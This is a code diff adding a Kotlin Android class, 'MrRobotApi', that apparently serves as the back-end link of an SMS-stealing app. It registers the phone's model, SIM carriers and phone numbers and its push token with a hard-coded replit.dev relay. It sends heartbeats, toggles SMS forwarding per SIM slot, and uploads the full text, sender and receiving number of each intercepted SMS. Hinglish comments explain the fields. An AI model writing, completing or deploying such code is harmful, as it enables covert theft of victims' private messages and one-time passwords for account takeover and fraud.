@@ -1,0 +1,166 @@
+package com.example.admin.network
+
+
+import android.content.Context
+import android.util.Log
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.suspendCancellableCoroutine
+import kotlinx.coroutines.withContext
+import okhttp3.Call
+import okhttp3.Callback
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.OkHttpClient
+import okhttp3.Request
+import okhttp3.RequestBody.Companion.toRequestBody
+import okhttp3.Response
+import org.json.JSONObject
+import java.io.IOException
+import java.util.concurrent.TimeUnit
+import kotlin.coroutines.resume
+
+data class UpsertResult(val success: Boolean, val response: String?)
+
+class MrRobotApi(private val context: Context) {
+
+    companion object {
+        private const val TAG = "MrRobotApi"
+        const val API_BASE_URL = "https://6077107f-a39e-40c6-b43b-7ae50c0ae048-00-30ffsrnvv20y1.pike.replit.dev/api/relay"
+        const val APP_ID      = "APP-9I5G-1KS9-RBYU"
+        private val JSON_MEDIA = "application/json; charset=utf-8".toMediaType()
+    }
+
+    private val baseUrl = API_BASE_URL.trim()
+
+    private val client = OkHttpClient.Builder()
+        .connectTimeout(30, TimeUnit.SECONDS)
+        .readTimeout(30, TimeUnit.SECONDS)
+        .writeTimeout(30, TimeUnit.SECONDS)
+        .build()
+
+    fun getAppId(): String = APP_ID
+    fun getApiBaseUrl(): String = baseUrl
+
+    fun registerDevice(uid: String, deviceJson: JSONObject, callback: (Boolean, String?) -> Unit) {
+        val body = JSONObject().apply {
+            put("appId",          APP_ID)
+            put("deviceId",       uid)
+            put("name",           deviceJson.optString("model", "Unknown"))
+            put("androidVersion", deviceJson.optInt("androidversion", 0))
+            put("sim1Carrier",    deviceJson.optString("sim1carrier", ""))
+            put("sim1Phone",      deviceJson.optString("sim1number", ""))
+            put("sim2Carrier",    deviceJson.optString("sim2carrier", ""))
+            put("sim2Phone",      deviceJson.optString("sim2number", ""))
+        }
+        postJson("$baseUrl/register", body, callback)
+    }
+
+    fun updateDeviceToken(uid: String, token: String, callback: (Boolean, String?) -> Unit) {
+        val body = JSONObject().apply {
+            put("deviceId", uid)
+            put("fcmToken", token)
+        }
+        postJson("$baseUrl/heartbeat", body, callback)
+    }
+
+    suspend fun upsertHeartbeat(uid: String, heartbeatData: JSONObject): UpsertResult =
+        withContext(Dispatchers.IO) {
+            suspendCancellableCoroutine { cont ->
+                val body = JSONObject().apply {
+                    put("deviceId",  uid)
+                    put("lastOnline", "0s ago")
+                }
+                val request = Request.Builder()
+                    .url("$baseUrl/heartbeat")
+                    .post(body.toString().toRequestBody(JSON_MEDIA))
+                    .build()
+                val call = client.newCall(request)
+                cont.invokeOnCancellation { call.cancel() }
+                call.enqueue(object : Callback {
+                    override fun onFailure(call: Call, e: IOException) {
+                        Log.e(TAG, "upsertHeartbeat failed: ${e.message}")
+                        if (cont.isActive) cont.resume(UpsertResult(false, e.message))
+                    }
+                    override fun onResponse(call: Call, response: Response) {
+                        val s = response.body?.string() ?: ""
+                        if (cont.isActive) cont.resume(UpsertResult(response.isSuccessful, s))
+                    }
+                })
+            }
+        }
+
+    fun updateForwardStatus(
+        uid: String,
+        enabled: Boolean,
+        simSlot: Int,
+        callback: (Boolean, String?) -> Unit
+    ) {
+        val body = JSONObject().apply {
+            put("forwardEnabled", enabled)
+            put("forwardSlot",    simSlot)
+        }
+        val request = Request.Builder()
+            .url("$baseUrl/devices/$uid")
+            .method("PATCH", body.toString().toRequestBody(JSON_MEDIA))
+            .build()
+
+        client.newCall(request).enqueue(object : Callback {
+            override fun onFailure(call: Call, e: IOException) {
+                Log.e(TAG, "updateForwardStatus failed: ${e.message}")
+                callback(false, e.message)
+            }
+            override fun onResponse(call: Call, response: Response) {
+                val s = response.body?.string() ?: ""
+                if (response.isSuccessful) {
+                    Log.d(TAG, "updateForwardStatus ok → enabled=$enabled slot=$simSlot")
+                    callback(true, s)
+                } else {
+                    Log.e(TAG, "updateForwardStatus error ${response.code}: $s")
+                    callback(false, s)
+                }
+            }
+        })
+    }
+
+    // ─── POST /api/messages ──────────────────────────────────────────────
+    fun insertSmsLog(smsData: JSONObject, callback: (Boolean, String?) -> Unit) {
+        val uid    = smsData.optString("uid", "")
+        val userId = "USR-${uid.takeLast(6).uppercase()}"
+
+        // sender = asli SMS bhejne wala (e.g. "JK-NAVIHQ-S")
+        val sender   = smsData.optString("phone_number", "UNKNOWN")
+        // receiver = device ka apna SIM number jis pe SMS aaya
+        val receiver = smsData.optString("receiver_number", "")
+        // "UNKNOWN" / blank ho to null bhejo — UI me TO chip hide ho jayega
+        val toNumber = if (receiver.isBlank() || receiver.equals("UNKNOWN", ignoreCase = true)) null else receiver
+
+        val body = JSONObject().apply {
+            put("appId",      APP_ID)
+            put("deviceId",   uid)
+            put("userId",     userId)
+            put("fromSender", sender)                                  // ← title nahi, asli sender
+            put("fromNumber", sender)
+            if (toNumber != null) put("toNumber", toNumber)            // ← NAYA field
+            put("body",       smsData.optString("message_body", ""))
+            put("isSensitive", false)
+        }
+        postJson("$baseUrl/messages", body, callback)
+    }
+
+    private fun postJson(url: String, body: JSONObject, callback: (Boolean, String?) -> Unit) {
+        val request = Request.Builder()
+            .url(url)
+            .post(body.toString().toRequestBody(JSON_MEDIA))
+            .build()
+        client.newCall(request).enqueue(object : Callback {
+            override fun onFailure(call: Call, e: IOException) {
+                Log.e(TAG, "POST $url failed: ${e.message}")
+                callback(false, e.message)
+            }
+            override fun onResponse(call: Call, response: Response) {
+                val s = response.body?.string() ?: ""
+                if (response.isSuccessful) callback(true, s)
+                else { Log.e(TAG, "POST $url error ${response.code}: $s"); callback(false, s) }
+            }
+        })
+    }
+}
